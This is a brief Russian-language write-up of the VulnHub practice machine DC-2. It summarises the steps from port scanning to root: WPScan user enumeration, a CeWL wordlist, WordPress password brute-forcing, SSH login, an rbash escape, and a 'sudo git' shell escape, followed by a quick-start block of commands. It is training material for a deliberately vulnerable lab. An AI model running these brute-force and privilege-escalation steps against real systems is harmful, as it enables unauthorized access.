# DC-2 — VulnHub

**Machine:** DC-2  
**Platform:** VulnHub  
**Difficulty:** Beginner  

---

## Кратко

Walkthrough виртуальной машины DC-2 — от сканирования портов до получения root.

**Основные этапы:**
- Nmap → порты 80 (HTTP) и 7744 (SSH)
- WPScan → пользователи admin, jerry, tom
- Cewl → генерация паролей из контента сайта
- Брутфорс → получены пароли для jerry и tom
- SSH (tom) + обход rbash через vi
- Повышение привилегий через `sudo git` → root

---

## Быстрый старт

```bash
# Добавить DNS
echo "192.168.0.113 dc-2" >> /etc/hosts

# Сканирование
nmap -sV -p- 192.168.0.113

# Генерация паролей
cewl http://dc-2 -w pass.txt

# Брутфорс WordPress
wpscan --url http://dc-2 -U users.txt -P pass.txt

# SSH и root
ssh tom@192.168.0.113 -p 7744
sudo git help config → !/bin/bash
